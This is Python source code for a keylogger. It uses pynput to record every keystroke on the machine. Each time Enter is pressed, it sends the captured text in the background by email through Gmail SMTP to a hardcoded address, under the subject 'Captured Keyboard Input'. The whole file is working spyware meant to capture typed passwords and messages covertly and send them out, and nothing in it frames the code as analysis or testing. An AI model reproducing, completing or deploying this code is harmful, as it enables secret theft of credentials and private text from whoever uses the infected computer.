import smtplib
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading
import time

result = ""
stop_listener = False
lock = threading.Lock()

def on_press(key):
    global result, stop_listener
    try:
        with lock:
            result += key.char
    except AttributeError:
        with lock:
            if key == keyboard.Key.space:
                result += " "
            elif key == keyboard.Key.enter:
                send_email_in_background(result)  # Send email when Enter key is pressed
                result = ""  # Clear the result after sending email
            elif key == keyboard.Key.esc:
                stop_listener = True  # Stop the listener when Escape key is pressed
            else:
                result += f" {key} "
    print(result)

def function_call():
    global stop_listener, result
    result = ""  # Reset result for new capture session
    stop_listener = False  # Reset stop flag
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Capture keyboard input indefinitely
    while not stop_listener:
        time.sleep(0.1)

    listener.stop()
    listener.join()
    return result

def send_email_in_background(body):
    def send_email():
        # Email credentials
        sender_email = "mperarasu10@gmail.com"
        receiver_email = "mperarasu10@gmail.com"
        password = "app_password"

        # Email content
        subject = "Captured Keyboard Input"

        # Create a MIMEText object
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = subject

        # Attach the body with the msg instance
        msg.attach(MIMEText(body, 'plain'))

        # SMTP server configuration
        smtp_server = "smtp.gmail.com"
        port = 465  # For SSL

        # Create a secure SSL context
        print("Creating SSL context...")
        context = smtplib.ssl.create_default_context()

        try:
            print("Connecting to the server...")
            with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
                print("Connected to the server.")
                
                print("Logging in...")
                server.login(sender_email, password)
                print("Logged in successfully.")
                
                print("Sending email...")
                server.sendmail(sender_email, receiver_email, msg.as_string())
                print("Email sent successfully!")
                
        except smtplib.SMTPConnectError:
            print("Failed to connect to the server. Wrong server address or port.")
        except smtplib.SMTPAuthenticationError:
            print("Failed to authenticate. Wrong email or password.")
        except smtplib.SMTPException as e:
            print(f"SMTP error occurred: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")

    # Start a new thread to send the email in the background
    email_thread = threading.Thread(target=send_email)
    email_thread.start()

# Start capturing keyboard input
function_call()
